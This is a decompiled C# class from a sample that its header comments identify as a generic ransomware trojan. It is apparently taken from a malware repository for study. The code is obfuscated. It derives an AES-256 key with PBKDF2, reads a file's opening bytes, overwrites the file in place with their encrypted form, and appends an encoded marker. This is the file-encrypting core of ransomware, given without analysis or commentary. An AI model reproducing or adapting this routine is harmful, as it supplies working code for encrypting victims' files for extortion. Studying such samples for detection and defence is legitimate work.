// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.yZSyNMrNhJ
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace MufMaOSvGyvz
{
  public static class yZSyNMrNhJ
  {
    public static byte[] vIrcBMpRPIYwNsX(byte[] byte_0, byte[] byte_1, byte[] byte_2)
    {
      byte[] numArray = (byte[]) null;
      Rfc2898DeriveBytes rfc2898DeriveBytes = yZSyNMrNhJ.OgulqRNbIpMUL(byte_1, byte_2);
      byte_1 = (byte[]) null;
      GC.Collect();
      using (Aes aes = (Aes) new AesManaged())
      {
        aes.KeySize = 256;
        aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
        aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
        aes.Padding = PaddingMode.None;
        aes.Mode = CipherMode.CBC;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(byte_0, 0, byte_0.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
        rfc2898DeriveBytes.Dispose();
      }
      return numArray;
    }

    public static Rfc2898DeriveBytes OgulqRNbIpMUL(byte[] byte_0, byte[] byte_1) => new Rfc2898DeriveBytes(byte_0, byte_1, 52768);

    public static byte[] GoOtXsDsUX(string string_0, int int_0)
    {
      FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
      byte[] buffer = new byte[int_0];
      fileStream.Read(buffer, 0, int_0);
      fileStream.Close();
      fileStream.Dispose();
      return buffer;
    }

    public static void vGnSKjsiWPsmf(string string_0, byte[] byte_0)
    {
      FileStream fileStream1 = new FileStream(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
      fileStream1.Write(byte_0, 0, byte_0.Length);
      fileStream1.Close();
      fileStream1.Dispose();
      byte[] bytes = Encoding.ASCII.GetBytes(IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc(IyUWqQZlcOSTLhq.LcFYzbWwUuFdZ) + IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc("LQ==") + Convert.ToString(IyUWqQZlcOSTLhq.tsQtKfDKZIMNuO) + IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc("LQ=="));
      using (FileStream fileStream2 = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
        fileStream2.Write(bytes, 0, bytes.Length);
    }
  }
}
